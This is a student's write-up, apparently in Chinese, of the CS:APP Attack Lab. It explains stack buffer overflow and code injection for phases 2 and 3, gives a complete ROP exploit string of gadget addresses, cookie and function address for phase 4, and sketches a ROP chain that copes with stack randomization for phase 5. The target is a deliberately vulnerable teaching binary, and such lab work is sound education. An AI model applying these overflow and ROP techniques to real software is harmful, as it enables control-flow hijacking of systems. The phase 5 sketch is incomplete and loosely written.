![](C:\Users\20153\AppData\Roaming\marktext\images\2025-10-10-11-17-09-image.png)

## Phase2（思路）

通过gdb可以知道test函数返回地址为0x5566b660，在getbuf函数分配栈空间后，%rsp的地址为0x5566b638，分配了0x28的空间（40字节）。我们将我们注入的代码汇编为字节码并作为正常字符输入，但是同第一问，最终输入的字符串超出了栈空间，改变了返回地址，使得函数控制权交给了注入的代码。

诸如的代码的功能就是将cookie传入touch2的参数寄存器%rdi，并将torch2的地址压栈，最后ret。

这里使用了ret指令的功能：从栈中弹出一个地址，并将%rip（程序计数器PC）设置为该地址。由于提前将touch2的地址压入栈中，ret指令返回对应地址，所以程序运行了touch2，并且修改了参数寄存器为cookie。

## Phase3

![](C:\Users\20153\AppData\Roaming\marktext\images\2025-10-10-13-01-10-image.png)

在touch3函数分配栈空间前，查看当前%rsp的元素（其实应该从0x5566b660开始，但是test函数分配了0x8的空间），发现0x5566b668之后还有空间

![](C:\Users\20153\AppData\Roaming\marktext\images\2025-10-10-14-31-23-image.png)

于是将phase2溢出后再一个字节的位置设置为cookie的16进制码，%rdi寄存器则保存对应地址。

## Phase4

ROP攻击。

在401f16处找到58 90 90 c3，即popq  %rax;  nop;  nop;  ret；

在401edf处找到48 89 c7 c3，即movq %rax, %rdi;  ret；

故答案为：

```textile
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
16 1f 40 00 00 00 00 00 // pop指令
b5 8f 32 2a 00 00 00 00 // cookie
df 1e 40 00 00 00 00 00 // move指令
64 1c 40 00 00 00 00 00 // touch2地址
```

```asm6502
pop %rax

```

## Phase5

由于栈随机，所以考虑栈指针+偏移来获取指针

![](C:\Users\20153\AppData\Roaming\marktext\images\2025-10-10-15-53-12-image.png)

有参考：[【CSAPP】【attacklab】实验三 Attack lab 详解_attacklab详解-CSDN博客](https://blog.csdn.net/weixin_72899100/article/details/144241370)

![](C:\Users\20153\AppData\Roaming\marktext\images\2025-10-10-16-29-30-image.png)

[修复 CS:APP 攻击实验室在新版 Ubuntu 22.04 上的段错误 | Rijuyuezhu 的博客 --- Fix CS:APP Attack Lab Segmentation Fault on Newest Ubuntu 22.04 | Rijuyuezhu's Blog](https://blog.rijuyuezhu.top/posts/db646f34/)

最终思路参考这篇：

[CSAPP Attack Lab详解 - Svicen - 博客园](https://www.cnblogs.com/SVicen/p/16838693.html#level-3-1)

```py
# 前0x28个字符填充0x00
popq %rax
bias = 0x20
movl %eax,%edx
movl %edx,%ecx
movl %ecx,%esi             # rsi为0x20
movq %rsp,%rax             # rax = rsp
movq %rax,%rdi
add_xy # 代替指令 lea (%rdi,%rsi,1),%rax
movq %rax,%rdi
# touch3地址
# cookie
00 00 00 00 00 00 00 00 00
# 对齐
```
